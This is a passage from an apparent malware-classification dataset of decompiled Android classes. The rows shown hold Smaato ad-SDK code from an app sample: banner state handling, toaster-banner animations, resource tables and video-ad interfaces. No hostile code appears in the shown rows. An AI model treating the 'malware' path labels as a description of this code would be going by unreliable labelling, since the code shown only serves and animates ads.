   setBannerAnimatorHandler(new BannerHandler(this,this,null));     }     return this.g;   } public class BannerHandler extends Handler {     private WeakReference<BaseView> b;     private BaseView c;     private BannerHandler(    BaseView baseView){       this.b=null;       this.c=baseView;     }     BannerHandler(    FullScreenView fullScreenView,    BaseView baseView,    BannerHandler bannerHandler){       this(baseView);     }     protected WeakReference<BaseView> a(){       if (this.b == null) {         this.b=new WeakReference<>(this.c);       }       return this.b;     }     @Override public void handleMessage(    final Message message){       super.handleMessage(message);       new CrashReportTemplate<Void>(){         @Override public Void b() throws Exception {           BaseView baseView=BannerHandler.this.a().get();           if (baseView != null) {             if (message.what == 101) {               baseView.getBannerState().b();               BannerAnimator.a().a(message.arg1,message.arg2,FullScreenView.this.getCurrentPackage(),baseView,FullScreenView.this.h);             }  else             if (message.what == 102) {               baseView.getBannerState().c();             }  else             if (message.what == 107) {               baseView.getBannerState().c();             }           }           return null;         }       } .c();     }   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma\id.code","public static final class id {   public static int hybrid=dev.camera360.collage.R.anim.left_right_anim;   public static int none=dev.camera360.collage.R.anim.custom_anim;   public static int normal=dev.camera360.collage.R.anim.fade_in;   public static int satellite=dev.camera360.collage.R.anim.fade_in2;   public static int terrain=dev.camera360.collage.R.anim.fade_out; } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma\integer.code","public static final class integer {   public static int google_play_services_version=dev.camera360.collage.R.array.min_level_options; } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma\LoadingStateDelegateImp.code","public class LoadingStateDelegateImp implements LoadingStateDelegate {   private WeakReference<BaseView> a;   public LoadingStateDelegateImp(  BaseView baseView){     this.a=new WeakReference<>(baseView);   }   @Override public void a() throws StateBlockedEnteredFailedException {     BaseView baseView;     try {       Debugger.a(new Object(){       } );       if (this.a != null && (baseView=this.a.get()) != null && baseView.getNextPackage() != null) {         baseView.getNextPackage().a();         baseView.setNextPackage(null);       }     }  catch (    RuntimeException e) {       throw e;     } catch (    Exception e2) {       throw new StateBlockedEnteredFailedException(e2);     }   }   @Override public void b() throws StateIdleEnteredException {     BaseView baseView;     try {       Debugger.a(new Object(){       } );       if (this.a != null && (baseView=this.a.get()) != null) {         baseView.g();         if (baseView.getNextPackage() != null) {           baseView.getNextPackage().a();           baseView.setNextPackage(null);         }       }     }  catch (    RuntimeException e) {       throw e;     } catch (    Exception e2) {       throw new StateIdleEnteredException(e2);     }   }   @Override public void c() throws BannerLoadingEnteredFailedException {     BaseView baseView;     try {       Debugger.a(new Object(){       } );       if (this.a != null && (baseView=this.a.get()) != null && baseView.getNextPackage() != null && baseView.getNextPackage().d() != null) {         baseView.getNextPackage().a(baseView.getContext(),baseView,baseView.getLoadingState(),baseView.getBannerAnimatorHandler());       }     }  catch (    RuntimeException e) {       throw e;     } catch (    Exception e2) {       throw new BannerLoadingEnteredFailedException(e2);     }   }   @Override public void d() throws TransitionLoadXMLFailedException {     BaseView baseView;     try {       Debugger.a(new Object(){       } );       if (this.a != null && (baseView=this.a.get()) != null && baseView.getAdDownloader() != null) {         baseView.getAdDownloader().b();       }     }  catch (    RuntimeException e) {       throw e;     } catch (    Exception e2) {       throw new TransitionLoadXMLFailedException(e2);     }   }   @Override public void e() throws TransitionFinishLoadingFailedException {     BaseView baseView;     try {       Debugger.a(new Object(){       } );       if (this.a != null && (baseView=this.a.get()) != null && baseView.getNextPackage() != null && baseView.getNextPackage().h() != null) {         if (baseView.getNextPackage() instanceof RichMediaBanner) {           baseView.getNextPackage().h().a();         }         baseView.getBannerState().e();       }     }  catch (    RuntimeException e) {       throw e;     } catch (    Exception e2) {       throw new TransitionFinishLoadingFailedException(e2);     }   }   @Override public void f() throws StateIdleExitFailedException {   }   @Override public void g() throws StateXMLLoadingEnteredFailedException {   }   @Override public void h() throws StateXMLLoadingExitFailedException {   }   @Override public void i() throws StateBlockedExitFailedException {   }   @Override public void j() throws BannerLoadingExitFailedException {   }   @Override public void k() throws TransitionLoadBannerFailedException {   }   @Override public void l() throws TransitionBlockLoadingFailedException {   }   @Override public void m() throws TransitionUnblockLoadingFailedException {   }   @Override public void n() throws TransitionErrorLoadingFailedException {   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma\R.code","public final class R { public static final class attr {     public static int AdType=2130772004;     public static int adDimension=2130772001;     public static int adSize=dev.camera360.collage.R.attr.adSize;     public static int adSpaceId=2130772005;     public static int adUnitId=dev.camera360.collage.R.attr.adUnitId;     public static int age=2130771998;     public static int autoReloadEnabled=2130771987;     public static int autoReloadFrequency=2130771986;     public static int backgroundColor=2130771985;     public static int bannerHeight=2130772003;     public static int bannerWidth=2130772002;     public static int cameraBearing=dev.camera360.collage.R.attr.testing;     public static int cameraTargetLat=dev.camera360.collage.R.attr.isGoneWithoutAd;     public static int cameraTargetLng=dev.camera360.collage.R.attr.gif;     public static int cameraTilt=dev.camera360.collage.R.attr.paused;     public static int cameraZoom=dev.camera360.collage.R.attr.gifMoviewViewStyle;     public static int city=2130771994;     public static int country=2130771993;     public static int fontColor=2130771984;     public static int gender=2130771999;     public static int keywordList=2130771990;     public static int latitude=2130771996;     public static int loadNewBanner=2130771988;     public static int locationUpdateEnabled=2130771989;     public static int longitude=2130771997;     public static int mapType=dev.camera360.collage.R.attr.keywords;     public static int publisherId=2130772006;     public static int region=2130771992;     public static int searchQuery=2130771991;     public static int uiCompass=dev.camera360.collage.R.attr.test_mode;     public static int uiRotateGestures=dev.camera360.collage.R.attr.banner_type;     public static int uiScrollGestures=dev.camera360.collage.R.attr.animation;     public static int uiTiltGestures=dev.camera360.collage.R.attr.placementType;     public static int uiZoomControls=dev.camera360.collage.R.attr.canShowMR;     public static int uiZoomGestures=2130771981;     public static int useViewLifecycle=2130771982;     public static int userProfileEnabled=2130772000;     public static int zOrderOnTop=2130771983;     public static int zip=2130771995;   } public static final class color {     public static int common_action_bar_splitter=dev.camera360.collage.R.layout.gadget_dialog;     public static int common_signin_btn_dark_text_default=dev.camera360.collage.R.layout.bookmark_grid_dialog;     public static int common_signin_btn_dark_text_disabled=dev.camera360.collage.R.layout.brush_chooser;     public static int common_signin_btn_dark_text_focused=dev.camera360.collage.R.layout.christmas_dialog;     public static int common_signin_btn_dark_text_pressed=dev.camera360.collage.R.layout.bookmark_item;     public static int common_signin_btn_default_background=dev.camera360.collage.R.layout.flickr_dialog;     public static int common_signin_btn_light_text_default=dev.camera360.collage.R.layout.comment_dialog;     public static int common_signin_btn_light_text_disabled=dev.camera360.collage.R.layout.custom_bar_notification;     public static int common_signin_btn_light_text_focused=dev.camera360.collage.R.layout.erase_chooser;     public static int common_signin_btn_light_text_pressed=dev.camera360.collage.R.layout.confirm_dialog3;     public static int common_signin_btn_text_dark=dev.camera360.collage.R.layout.gadget_dialog2;     public static int common_signin_btn_text_light=dev.camera360.collage.R.layout.gallery_dialog2;   } public static final class drawable {     public static int common_signin_btn_icon_dark=dev.camera360.collage.R.drawable.add_button;     public static int common_signin_btn_icon_disabled_dark=dev.camera360.collage.R.drawable.add_text_button;     public static int common_signin_btn_icon_disabled_focus_dark=dev.camera360.collage.R.drawable.addappicon_button;     public static int common_signin_btn_icon_disabled_focus_light=dev.camera360.collage.R.drawable.addbookmark_button;     public static int common_signin_btn_icon_disabled_light=dev.camera360.collage.R.drawable.addinstant;     public static int common_signin_btn_icon_focus_dark=dev.camera360.collage.R.drawable.addmoment_button;     public static int common_signin_btn_icon_focus_light=dev.camera360.collage.R.drawable.af_icon_list;     public static int common_signin_btn_icon_light=dev.camera360.collage.R.drawable.alert_dialog_icon;     public static int common_signin_btn_icon_normal_dark=dev.camera360.collage.R.drawable.antivirus;     public static int common_signin_btn_icon_normal_light=dev.camera360.collage.R.drawable.appicon_button;     public static int common_signin_btn_icon_pressed_dark=dev.camera360.collage.R.drawable.apply_button;     public static int common_signin_btn_icon_pressed_light=dev.camera360.collage.R.drawable.arrow_left_button;     public static int common_signin_btn_text_dark=dev.camera360.collage.R.drawable.arrow_left_normal;     public static int common_signin_btn_text_disabled_dark=dev.camera360.collage.R.drawable.arrow_left_pressed;     public static int common_signin_btn_text_disabled_focus_dark=dev.camera360.collage.R.drawable.arrow_right_button;     public static int common_signin_btn_text_disabled_focus_light=dev.camera360.collage.R.drawable.arrow_right_normal;     public static int common_signin_btn_text_disabled_light=dev.camera360.collage.R.drawable.arrow_right_pressed;     public static int common_signin_btn_text_focus_dark=dev.camera360.collage.R.drawable.back_button;     public static int common_signin_btn_text_focus_light=dev.camera360.collage.R.drawable.back_button2;     public static int common_signin_btn_text_light=dev.camera360.collage.R.drawable.back_draw_button;     public static int common_signin_btn_text_normal_dark=dev.camera360.collage.R.drawable.bestyoutube_icon;     public static int common_signin_btn_text_normal_light=dev.camera360.collage.R.drawable.bg_flat_grey_border;     public static int common_signin_btn_text_pressed_dark=dev.camera360.collage.R.drawable.bg_flight_gray_body;     public static int common_signin_btn_text_pressed_light=dev.camera360.collage.R.drawable.bg_flight_gray_bottom;     public static int ic_plusone_medium_off_client=dev.camera360.collage.R.drawable.bg_flight_gray_top;     public static int ic_plusone_small_off_client=dev.camera360.collage.R.drawable.bg_flight_white_body;     public static int ic_plusone_standard_off_client=dev.camera360.collage.R.drawable.bg_flight_white_bottom;     public static int ic_plusone_tall_off_client=dev.camera360.collage.R.drawable.bg_flight_white_top;   } public static final class id {     public static int hybrid=dev.camera360.collage.R.anim.left_right_anim;     public static int none=dev.camera360.collage.R.anim.custom_anim;     public static int normal=dev.camera360.collage.R.anim.fade_in;     public static int satellite=dev.camera360.collage.R.anim.fade_in2;     public static int terrain=dev.camera360.collage.R.anim.fade_out;   } public static final class integer {     public static int google_play_services_version=dev.camera360.collage.R.array.min_level_options;   } public static final class string {     public static int Keyword=2131034139;     public static int Search=2131034140;     public static int app_name=2131034141;     public static int auth_client_needs_enabling_title=2131034133;     public static int auth_client_needs_installation_title=2131034134;     public static int auth_client_needs_update_title=2131034135;     public static int auth_client_play_services_err_notification_msg=2131034136;     public static int auth_client_requested_by_msg=2131034137;     public static int auth_client_using_bad_version_title=2131034132;     public static int common_google_play_services_enable_button=2131034118;     public static int common_google_play_services_enable_text=2131034117;     public static int common_google_play_services_enable_title=dev.camera360.collage.R.raw.popular_quotes;     public static int common_google_play_services_install_button=dev.camera360.collage.R.raw.new_quotes;     public static int common_google_play_services_install_text_phone=dev.camera360.collage.R.raw.help_eng;     public static int common_google_play_services_install_text_tablet=dev.camera360.collage.R.raw.help_thai;     public static int common_google_play_services_install_title=dev.camera360.collage.R.raw.changelog_eng;     public static int common_google_play_services_invalid_account_text=2131034124;     public static int common_google_play_services_invalid_account_title=2131034123;     public static int common_google_play_services_network_error_text=2131034122;     public static int common_google_play_services_network_error_title=2131034121;     public static int common_google_play_services_unknown_issue=2131034125;     public static int common_google_play_services_unsupported_date_text=2131034128;     public static int common_google_play_services_unsupported_text=2131034127;     public static int common_google_play_services_unsupported_title=2131034126;     public static int common_google_play_services_update_button=2131034129;     public static int common_google_play_services_update_text=2131034120;     public static int common_google_play_services_update_title=2131034119;     public static int common_signin_button_text=2131034130;     public static int common_signin_button_text_long=2131034131;     public static int getad=2131034138;   } public static final class styleable {     public static final int AdsAttrs_adSize=0x00000000;     public static final int AdsAttrs_adUnitId=0x00000001;     public static final int MapAttrs_cameraBearing=0x00000001;     public static final int MapAttrs_cameraTargetLat=0x00000002;     public static final int MapAttrs_cameraTargetLng=0x00000003;     public static final int MapAttrs_cameraTilt=0x00000004;     public static final int MapAttrs_cameraZoom=0x00000005;     public static final int MapAttrs_mapType=0x00000000;     public static final int MapAttrs_uiCompass=0x00000006;     public static final int MapAttrs_uiRotateGestures=0x00000007;     public static final int MapAttrs_uiScrollGestures=0x00000008;     public static final int MapAttrs_uiTiltGestures=0x00000009;     public static final int MapAttrs_uiZoomControls=0x0000000a;     public static final int MapAttrs_uiZoomGestures=0x0000000b;     public static final int MapAttrs_useViewLifecycle=0x0000000c;     public static final int MapAttrs_zOrderOnTop=0x0000000d;     public static final int com_smaato_soma_BannerView_AdType=0x00000014;     public static final int com_smaato_soma_BannerView_adDimension=0x00000011;     public static final int com_smaato_soma_BannerView_adSpaceId=0x00000015;     public static final int com_smaato_soma_BannerView_age=0x0000000e;     public static final int com_smaato_soma_BannerView_autoReloadEnabled=0x00000003;     public static final int com_smaato_soma_BannerView_autoReloadFrequency=0x00000002;     public static final int com_smaato_soma_BannerView_backgroundColor=0x00000001;     public static final int com_smaato_soma_BannerView_bannerHeight=0x00000013;     public static final int com_smaato_soma_BannerView_bannerWidth=0x00000012;     public static final int com_smaato_soma_BannerView_city=0x0000000a;     public static final int com_smaato_soma_BannerView_country=0x00000009;     public static final int com_smaato_soma_BannerView_fontColor=0x00000000;     public static final int com_smaato_soma_BannerView_gender=0x0000000f;     public static final int com_smaato_soma_BannerView_keywordList=0x00000006;     public static final int com_smaato_soma_BannerView_latitude=0x0000000c;     public static final int com_smaato_soma_BannerView_loadNewBanner=0x00000004;     public static final int com_smaato_soma_BannerView_locationUpdateEnabled=0x00000005;     public static final int com_smaato_soma_BannerView_longitude=0x0000000d;     public static final int com_smaato_soma_BannerView_publisherId=0x00000016;     public static final int com_smaato_soma_BannerView_region=0x00000008;     public static final int com_smaato_soma_BannerView_searchQuery=0x00000007;     public static final int com_smaato_soma_BannerView_userProfileEnabled=0x00000010;     public static final int com_smaato_soma_BannerView_zip=0x0000000b;     public static final int[] AdsAttrs={dev.camera360.collage.R.attr.adSize,dev.camera360.collage.R.attr.adUnitId};     public static final int[] MapAttrs={dev.camera360.collage.R.attr.keywords,dev.camera360.collage.R.attr.testing,dev.camera360.collage.R.attr.isGoneWithoutAd,dev.camera360.collage.R.attr.gif,dev.camera360.collage.R.attr.paused,dev.camera360.collage.R.attr.gifMoviewViewStyle,dev.camera360.collage.R.attr.test_mode,dev.camera360.collage.R.attr.banner_type,dev.camera360.collage.R.attr.animation,dev.camera360.collage.R.attr.placementType,dev.camera360.collage.R.attr.canShowMR,2130771981,2130771982,2130771983};     public static final int[] com_smaato_soma_BannerView={2130771984,2130771985,2130771986,2130771987,2130771988,2130771989,2130771990,2130771991,2130771992,2130771993,2130771994,2130771995,2130771996,2130771997,2130771998,2130771999,2130772000,2130772001,2130772002,2130772003,2130772004,2130772005,2130772006};   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma\ReceivedBannerInterface.code","public interface ReceivedBannerInterface {   BannerStatus a();   void a(  Context context) throws OpeningLandingPageFailed ;   AdType b();   String c();   String d();   List<String> e();   String f();   String g();   String h();   ErrorCode i(); } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma\StandardPublisherMethods.code","interface StandardPublisherMethods extends BaseInterface {   void a(  AdListenerInterface adListenerInterface);   boolean b(  AdListenerInterface adListenerInterface); } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma\string.code","public static final class string {   public static int Keyword=2131034139;   public static int Search=2131034140;   public static int app_name=2131034141;   public static int auth_client_needs_enabling_title=2131034133;   public static int auth_client_needs_installation_title=2131034134;   public static int auth_client_needs_update_title=2131034135;   public static int auth_client_play_services_err_notification_msg=2131034136;   public static int auth_client_requested_by_msg=2131034137;   public static int auth_client_using_bad_version_title=2131034132;   public static int common_google_play_services_enable_button=2131034118;   public static int common_google_play_services_enable_text=2131034117;   public static int common_google_play_services_enable_title=dev.camera360.collage.R.raw.popular_quotes;   public static int common_google_play_services_install_button=dev.camera360.collage.R.raw.new_quotes;   public static int common_google_play_services_install_text_phone=dev.camera360.collage.R.raw.help_eng;   public static int common_google_play_services_install_text_tablet=dev.camera360.collage.R.raw.help_thai;   public static int common_google_play_services_install_title=dev.camera360.collage.R.raw.changelog_eng;   public static int common_google_play_services_invalid_account_text=2131034124;   public static int common_google_play_services_invalid_account_title=2131034123;   public static int common_google_play_services_network_error_text=2131034122;   public static int common_google_play_services_network_error_title=2131034121;   public static int common_google_play_services_unknown_issue=2131034125;   public static int common_google_play_services_unsupported_date_text=2131034128;   public static int common_google_play_services_unsupported_text=2131034127;   public static int common_google_play_services_unsupported_title=2131034126;   public static int common_google_play_services_update_button=2131034129;   public static int common_google_play_services_update_text=2131034120;   public static int common_google_play_services_update_title=2131034119;   public static int common_signin_button_text=2131034130;   public static int common_signin_button_text_long=2131034131;   public static int getad=2131034138; } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma\styleable.code","public static final class styleable {   public static final int AdsAttrs_adSize=0x00000000;   public static final int AdsAttrs_adUnitId=0x00000001;   public static final int MapAttrs_cameraBearing=0x00000001;   public static final int MapAttrs_cameraTargetLat=0x00000002;   public static final int MapAttrs_cameraTargetLng=0x00000003;   public static final int MapAttrs_cameraTilt=0x00000004;   public static final int MapAttrs_cameraZoom=0x00000005;   public static final int MapAttrs_mapType=0x00000000;   public static final int MapAttrs_uiCompass=0x00000006;   public static final int MapAttrs_uiRotateGestures=0x00000007;   public static final int MapAttrs_uiScrollGestures=0x00000008;   public static final int MapAttrs_uiTiltGestures=0x00000009;   public static final int MapAttrs_uiZoomControls=0x0000000a;   public static final int MapAttrs_uiZoomGestures=0x0000000b;   public static final int MapAttrs_useViewLifecycle=0x0000000c;   public static final int MapAttrs_zOrderOnTop=0x0000000d;   public static final int com_smaato_soma_BannerView_AdType=0x00000014;   public static final int com_smaato_soma_BannerView_adDimension=0x00000011;   public static final int com_smaato_soma_BannerView_adSpaceId=0x00000015;   public static final int com_smaato_soma_BannerView_age=0x0000000e;   public static final int com_smaato_soma_BannerView_autoReloadEnabled=0x00000003;   public static final int com_smaato_soma_BannerView_autoReloadFrequency=0x00000002;   public static final int com_smaato_soma_BannerView_backgroundColor=0x00000001;   public static final int com_smaato_soma_BannerView_bannerHeight=0x00000013;   public static final int com_smaato_soma_BannerView_bannerWidth=0x00000012;   public static final int com_smaato_soma_BannerView_city=0x0000000a;   public static final int com_smaato_soma_BannerView_country=0x00000009;   public static final int com_smaato_soma_BannerView_fontColor=0x00000000;   public static final int com_smaato_soma_BannerView_gender=0x0000000f;   public static final int com_smaato_soma_BannerView_keywordList=0x00000006;   public static final int com_smaato_soma_BannerView_latitude=0x0000000c;   public static final int com_smaato_soma_BannerView_loadNewBanner=0x00000004;   public static final int com_smaato_soma_BannerView_locationUpdateEnabled=0x00000005;   public static final int com_smaato_soma_BannerView_longitude=0x0000000d;   public static final int com_smaato_soma_BannerView_publisherId=0x00000016;   public static final int com_smaato_soma_BannerView_region=0x00000008;   public static final int com_smaato_soma_BannerView_searchQuery=0x00000007;   public static final int com_smaato_soma_BannerView_userProfileEnabled=0x00000010;   public static final int com_smaato_soma_BannerView_zip=0x0000000b;   public static final int[] AdsAttrs={dev.camera360.collage.R.attr.adSize,dev.camera360.collage.R.attr.adUnitId};   public static final int[] MapAttrs={dev.camera360.collage.R.attr.keywords,dev.camera360.collage.R.attr.testing,dev.camera360.collage.R.attr.isGoneWithoutAd,dev.camera360.collage.R.attr.gif,dev.camera360.collage.R.attr.paused,dev.camera360.collage.R.attr.gifMoviewViewStyle,dev.camera360.collage.R.attr.test_mode,dev.camera360.collage.R.attr.banner_type,dev.camera360.collage.R.attr.animation,dev.camera360.collage.R.attr.placementType,dev.camera360.collage.R.attr.canShowMR,2130771981,2130771982,2130771983};   public static final int[] com_smaato_soma_BannerView={2130771984,2130771985,2130771986,2130771987,2130771988,2130771989,2130771990,2130771991,2130771992,2130771993,2130771994,2130771995,2130771996,2130771997,2130771998,2130771999,2130772000,2130772001,2130772002,2130772003,2130772004,2130772005,2130772006}; } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma\ToasterBanner.code","public class ToasterBanner extends RelativeLayout implements BaseViewInterface {   private Context a;   private final View b;   private CloseButtonView c;   private ToasterLayout d;   private boolean e; class AnonymousClass1 extends CrashReportTemplate<Void> {     final ToasterBanner a;     @Override public Void b() throws Exception {       this.a.e();       return null;     }   }   public void e() throws ToasterBannerInitFailed {     UserSettings userSettings;     AdSettings adSettings=null;     try {       Debugger.a(new Object(){       } );       removeAllViews();       this.c=new CloseButtonView(this.a);       this.c.setOnClickListener(new View.OnClickListener(){         @Override public void onClick(        View view){           new CrashReportTemplate<Void>(){             @Override public Void b() throws Exception {               ToasterBanner.this.d();               return null;             }           } .c();         }       } );       if (this.d != null) {         userSettings=this.d.getUserSettings();         adSettings=this.d.getAdSettings();       }  else {         userSettings=null;       }       this.d=new ToasterLayout(this.a,this);       if (adSettings != null && userSettings != null) {         this.d.setAdSettings(adSettings);         this.d.setUserSettings(userSettings);       }       setBackgroundColor(0);       this.c.setVisibility(8);       this.d.setLayoutParams(new RelativeLayout.LayoutParams(-1,Converter.a().a(getContext())));       setLayoutParams(new RelativeLayout.LayoutParams(-1,Converter.a().a(getContext()) + 20));       addView(this.c);       addView(this.d);       this.c.bringToFront();       if (this.b != null && getParent() == null) {         ((ViewGroup)this.b).addView(this);       }     }  catch (    RuntimeException e) {       throw e;     } catch (    Exception e2) {       throw new ToasterBannerInitFailed(e2);     }   }   @Override public void a(  final AdListenerInterface adListenerInterface){     new CrashReportTemplate<Void>(){       @Override public Void b() throws Exception {         ToasterBanner.this.d.a(adListenerInterface);         return null;       }     } .c();   }   @Override public boolean b(  final AdListenerInterface adListenerInterface){     return new CrashReportTemplate<Boolean>(){       @Override public Boolean b() throws Exception {         return Boolean.valueOf(ToasterBanner.this.d.b(adListenerInterface));       }     } .c().booleanValue();   }   @Override public void setLocationUpdateEnabled(  final boolean z){     new CrashReportTemplate<Void>(){       @Override public Void b() throws Exception {         ToasterBanner.this.d.setLocationUpdateEnabled(z);         return null;       }     } .c();   }   @Override public boolean c(){     return new CrashReportTemplate<Boolean>(){       @Override public Boolean b() throws Exception {         return Boolean.valueOf(ToasterBanner.this.d.c());       }     } .c().booleanValue();   }   @Override public UserSettings getUserSettings(){     return new CrashReportTemplate<UserSettings>(){       @Override public UserSettings b() throws Exception {         return ToasterBanner.this.d.getUserSettings();       }     } .c();   }   @Override public void setUserSettings(  final UserSettings userSettings){     new CrashReportTemplate<Void>(){       @Override public Void b() throws Exception {         ToasterBanner.this.d.setUserSettings(userSettings);         return null;       }     } .c();   }   public int getBackgroundColor(){     return new CrashReportTemplate<Integer>(){       @Override public Integer b() throws Exception {         return Integer.valueOf(ToasterBanner.this.d.getBackgroundColor());       }     } .c().intValue();   }   @Override public void setBannerStateListener(  final BannerStateListener bannerStateListener){     new CrashReportTemplate<Void>(){       @Override public Void b() throws Exception {         ToasterBanner.this.d.setBannerStateListener(bannerStateListener);         return null;       }     } .c();   }   @Override public AdSettings getAdSettings(){     return new CrashReportTemplate<AdSettings>(){       @Override public AdSettings b() throws Exception {         return ToasterBanner.this.d.getAdSettings();       }     } .c();   }   @Override public void setAdSettings(  final AdSettings adSettings){     new CrashReportTemplate<Void>(){       @Override public Void b() throws Exception {         ToasterBanner.this.d.setAdSettings(adSettings);         return null;       }     } .c();   }   @Override public void b(){     new CrashReportTemplate<Void>(){       @Override public Void b() throws Exception {         if (Controller.a().d()) {           ToasterBanner.this.e();           Controller.a().c();         }         ToasterBanner.this.d();         ToasterBanner.this.d.b();         System.gc();         return null;       }     } .c();   } public class AnonymousClass16 extends CrashReportTemplate<Void> {     AnonymousClass16(){     }     @Override public Void b() throws Exception {       if (ToasterBanner.this.h()) {         ((RelativeLayout.LayoutParams)ToasterBanner.this.d.getLayoutParams()).addRule(12);         ToasterBanner.this.d.requestLayout();         ToasterBanner.this.setVisibility(0);         ToasterBanner.this.d.setVisibility(0);         ToasterBanner.this.c.setVisibility(0);         DisplayMetrics displayMetrics=new DisplayMetrics();         ((WindowManager)ToasterBanner.this.getContext().getSystemService(""window"")).getDefaultDisplay().getMetrics(displayMetrics);         int measuredHeight=displayMetrics.heightPixels - ToasterBanner.this.b.getMeasuredHeight();         ToasterBanner.this.getLocationOnScreen(new int[2]);         final int measuredHeight2=(displayMetrics.heightPixels - ToasterBanner.this.getMeasuredHeight()) - measuredHeight;         ObjectAnimator ofFloat=ObjectAnimator.ofFloat(ToasterBanner.this,""translationY"",ToasterBanner.this.b.getMeasuredHeight(),measuredHeight2 - 20);         ofFloat.setDuration(300L);         ofFloat.start();         ofFloat.addListener(new Animator.AnimatorListener(){           @Override public void onAnimationStart(          Animator animator){           }           @Override public void onAnimationRepeat(          Animator animator){           }           @Override public void onAnimationEnd(          Animator animator){             final int i=measuredHeight2;             new CrashReportTemplate<Void>(){               @Override public Void b() throws Exception {                 ObjectAnimator ofFloat2=ObjectAnimator.ofFloat(ToasterBanner.this,""translationY"",i - 20,i);                 ofFloat2.setDuration(100L);                 ofFloat2.start();                 return null;               }             } .c();           }           @Override public void onAnimationCancel(          Animator animator){           }         } );       }  else {         ToasterBanner.this.f();       }       return null;     }   }   public void a(){     Debugger.a(new Object(){     } );     new AnonymousClass16().c();   } public class AnonymousClass18 extends CrashReportTemplate<Void> {     AnonymousClass18(){     }     @Override public Void b() throws Exception {       if (ToasterBanner.this.h()) {         DisplayMetrics displayMetrics=new DisplayMetrics();         ((WindowManager)ToasterBanner.this.getContext().getSystemService(""window"")).getDefaultDisplay().getMetrics(displayMetrics);         int measuredHeight=displayMetrics.heightPixels - ToasterBanner.this.b.getMeasuredHeight();         int[] iArr=new int[2];         ToasterBanner.this.getLocationOnScreen(iArr);         int measuredHeight2=(displayMetrics.heightPixels - ToasterBanner.this.getMeasuredHeight()) - measuredHeight;         if (iArr[1] < displayMetrics.heightPixels) {           ObjectAnimator ofFloat=ObjectAnimator.ofFloat(ToasterBanner.this,""translationY"",measuredHeight2,ToasterBanner.this.b.getMeasuredHeight());           ofFloat.setDuration(300L);           ofFloat.addListener(new Animator.AnimatorListener(){             @Override public void onAnimationStart(            Animator animator){             }             @Override public void onAnimationRepeat(            Animator animator){             }             @Override public void onAnimationEnd(            Animator animator){               new CrashReportTemplate<Void>(){                 @Override public Void b() throws Exception {                   ToasterBanner.this.setVisibility(8);                   ToasterBanner.this.d.setVisibility(8);                   ToasterBanner.this.c.setVisibility(8);                   return null;                 }               } .c();             }             @Override public void onAnimationCancel(            Animator animator){             }           } );           ofFloat.start();         }       }  else {         ToasterBanner.this.g();       }       return null;     }   }   public void d(){     Debugger.a(new Object(){     } );     new AnonymousClass18().c();   }   public void f() throws SettingToasterToVisibleFailed {     try {       Debugger.a(new Object(){       } );       setVisibility(0);     }  catch (    RuntimeException e) {       throw e;     } catch (    Exception e2) {       throw new SettingToasterToVisibleFailed(e2);     }   }   public void g() throws SettingToasterToGoneFailed {     try {       Debugger.a(new Object(){       } );       setVisibility(8);     }  catch (    RuntimeException e) {       throw e;     } catch (    Exception e2) {       throw new SettingToasterToGoneFailed(e2);     }   }   public boolean h() throws RetrievingSDKVersionFailed {     try {       Debugger.a(new Object(){       } );       return Build.VERSION.SDK_INT >= 11;     }  catch (    RuntimeException e) {       throw e;     } catch (    Exception e2) {       throw new RetrievingSDKVersionFailed(e2);     }   }   public final void setScalingEnabled(  boolean z){     this.e=z;   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma\VideoBannerView.code","public class VideoBannerView extends BannerView {   private VideoListener j;   public VideoBannerView(  Context context){     super(context);     i();   }   public VideoBannerView(  Context context,  AttributeSet attributeSet){     super(context,attributeSet);     i();   }   public VideoBannerView(  Context context,  AttributeSet attributeSet,  int i){     super(context,attributeSet,i);     i();   }   public void setVideoListener(  VideoListener videoListener){     this.j=videoListener;   }   private void i(){     getAdSettings().a(AdDimension.NOT_SET);   }   public VideoListener getVideoListener(){     return this.j;   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma\VideoInterface.code","public interface VideoInterface {   public enum VideoState {  EMPTY,   STOPPED,   FINISHED,   PAUSED,   RUNNING;   public static VideoState[] valuesCustom(){     VideoState[] valuesCustom=values();     int length=valuesCustom.length;     VideoState[] videoStateArr=new VideoState[length];     System.arraycopy(valuesCustom,0,videoStateArr,0,length);     return videoStateArr;   } }   void a(); } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma\VideoListener.code","public interface VideoListener {   void a(  VideoInterface videoInterface) throws StartingVideoFailed ;   void b(  VideoInterface videoInterface); } "
